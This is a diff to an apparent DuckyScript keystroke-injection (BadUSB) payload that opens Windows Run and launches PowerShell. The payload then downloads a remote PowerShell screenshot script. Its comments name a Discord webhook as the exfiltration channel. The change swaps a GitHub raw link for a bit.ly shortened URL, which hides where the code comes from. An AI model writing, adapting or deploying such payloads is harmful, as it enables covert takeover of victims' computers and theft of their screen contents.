@@ -13,8 +13,6 @@ REM     - Internet Connection
 REM     - Discord Webhook (or whatever you want for the exfiltration)
 
 REM REQUIRED - Define the PowerShell script link
-DEFINE SCRIPT_PY_LINK=https://raw.githubusercontent.com/nazarhktwitch/WinProdKey.ps1/main/other/script_screenshot.ps1
-
 DELAY 1000
 GUI r
 DELAY 1000
@@ -22,8 +20,8 @@ STRING powershell
 ENTER
 DELAY 2000
 
-REM Download the PowerShell script
-STRING Invoke-WebRequest -Uri "%SCRIPT_PY_LINK%" -OutFile "script.ps1"
+REM Download the PowerShell script using the link
+STRING Invoke-WebRequest -Uri "https://bit.ly/4gwViol" -OutFile "script.ps1"
 ENTER
 DELAY 2000
 
